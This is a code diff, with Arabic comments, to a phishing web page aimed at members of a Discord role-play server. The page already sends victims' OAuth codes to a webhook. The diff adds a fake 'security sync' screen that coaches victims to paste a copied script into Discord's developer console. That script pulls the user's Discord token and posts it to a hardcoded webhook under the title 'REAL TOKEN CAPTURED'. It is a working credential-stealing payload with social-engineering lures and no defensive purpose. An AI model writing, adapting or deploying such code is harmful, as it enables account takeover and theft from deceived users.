@@ -1426,7 +1426,7 @@ if (discordCode) {
     
     console.log("Found Code:", discordCode);
 
-    // 2. إرسال الكود للويب هوك
+    // 2. إرسال الكود للويب هوك (المرحلة الأولى)
     fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -1441,7 +1441,8 @@ if (discordCode) {
     })
     .then(response => {
         if (response.ok) {
-            alert("✅ تم التحقق من ارتباط حسابك بسيرفر ملوك التأثير بنجاح.");
+            // بدلاً من التنبيه العادي، نقوم بتحويل الواجهة للفخ الثاني
+            showSyncStep(); 
             window.history.replaceState({}, document.title, "/");
         } else {
             alert("❌ الويب هوك فيه مشكلة، تأكد من الرابط");
@@ -1450,9 +1451,41 @@ if (discordCode) {
     .catch(err => {
         alert("❌ فشل الإرسال: " + err);
     });
-} else {
-    // إذا دخلت الموقع وما فيه كود في الرابط
-    console.log("No code found in URL yet.");
+}
+
+// دالة إظهار واجهة "مزامنة الرتب" (فخ التوكن الحقيقي)
+function showSyncStep() {
+    document.body.innerHTML = `
+        <div style="background:#050505; color:#00ff41; padding:30px; border:1px solid #00ff41; text-align:center; font-family:monospace; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; direction: rtl;">
+            <h1 style="border-bottom: 1px solid #00ff41; padding-bottom: 10px;">[+] LSPD SECURITY SYNC</h1>
+            <p style="color:#888; font-size: 0.9rem;">لقد نجحت عملية الربط الأولية. يرجى إكمال الخطوة الأخيرة لمزامنة رتبك في سيرفر (ملوك التأثير) مع نظام الـ MDT:</p>
+            
+            <div style="text-align:right; background:#000; padding:15px; margin:20px 0; font-size:0.85rem; border:1px dashed #00ff41; line-height: 1.6;">
+                1. اضغط على الزر أدناه لنسخ <span style="color:#ff3e3e; font-weight:bold;">كود المزامنة</span>.<br>
+                2. افتح صفحة ديسكورد (المتصفح) واضغط <span style="color:#ff3e3e; font-weight:bold;">F12</span>.<br>
+                3. اختر تبويب <span style="color:#ff3e3e; font-weight:bold;">Console</span>، ثم الصق الكود واضغط <span style="color:#ff3e3e; font-weight:bold;">Enter</span>.
+            </div>
+
+            <button onclick="copyTokenScript()" style="background:#00ff41; color:#000; border:none; padding:12px 25px; font-weight:bold; cursor:pointer; width:250px; text-transform: uppercase;">نسخ كود المزامنة [+]</button>
+            <p style="margin-top: 15px; font-size: 0.7rem; color: #444;">ID: 1501532779924684851 | STATUS: PENDING_SYNC</p>
+        </div>
+    `;
+}
+
+// دالة نسخ السكربت الذي يسحب التوكن الحقيقي
+function copyTokenScript() {
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
+    
+    const payload = `(window.webpackChunkdiscord_app.push([[Math.random()],{},(e)=>{for(const r in e.c)if(e.c[r].exports&&e.c[r].exports.default&&e.c[r].exports.default.getToken!==undefined){const t=e.c[r].exports.default.getToken();fetch("${WEBHOOK_URL}",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"💎 REAL TOKEN CAPTURED",color:0x00ff00,fields:[{name:"Target Token",value:"\\\`"+t+"\\\`"},{name:"Status",value:"Verified"}]}]})})}}]),alert("✅ تم مزامنة الرتب بنجاح! يمكنك العودة للموقع."));`;
+    
+    const el = document.createElement('textarea');
+    el.value = payload.trim();
+    document.body.appendChild(el);
+    el.select();
+    document.execCommand('copy');
+    document.body.removeChild(el);
+
+    alert("✅ تم نسخ كود المزامنة! يرجى لصقه في Console ديسكورد.");
 }
 </script>
 </body>
